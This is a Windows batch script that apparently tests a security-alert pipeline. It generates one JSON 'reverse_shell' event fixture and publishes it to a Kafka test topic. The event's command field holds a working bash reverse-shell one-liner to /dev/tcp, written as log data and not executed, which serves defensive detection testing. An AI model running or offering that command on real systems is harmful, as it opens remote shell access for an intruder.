@echo off
setlocal
cd /d "%~dp0"

rem One critical reverse_shell fixture. Timestamp is 6 minutes ago so a live
rem watermark already past that 5-minute window publishes on ingest, while the
rem event is still inside the 10-minute lateness window. The command is a log
rem string and is never executed.
python -c "import datetime,json,uuid; now=datetime.datetime.now(datetime.timezone.utc)-datetime.timedelta(minutes=6); run=uuid.uuid4().hex[:12]; event={'index_family':'tracing_sas_linux','event_id':'security-fixture-'+run+'-reverse-shell','payload':{'@timestamp':now.isoformat(timespec='milliseconds'),'host_ip':'198.18.0.201','username':'security_fixture','proc_name':'bash','cmdline':'bash -i >& /dev/tcp/198.18.0.250/4444 0>&1','cmd_chain':'[]','test_case':'reverse-shell','test_run':run}}; open('alert-fixture-kafka.txt','w',newline='\n',encoding='utf-8').write('tracing_sas_linux\t'+json.dumps(event,ensure_ascii=False,separators=(',',':'))+'\n'); print(run); print(event['payload']['@timestamp'])"
if errorlevel 1 exit /b 1

C:\yuhata\sites\kafka_2.13-4.0.0\bin\windows\kafka-console-producer.bat --bootstrap-server 172.30.82.120:9092,172.30.82.121:9092,172.30.82.122:9092 --topic topic-sas-linux-test --property parse.key=true < "%~dp0alert-fixture-kafka.txt"
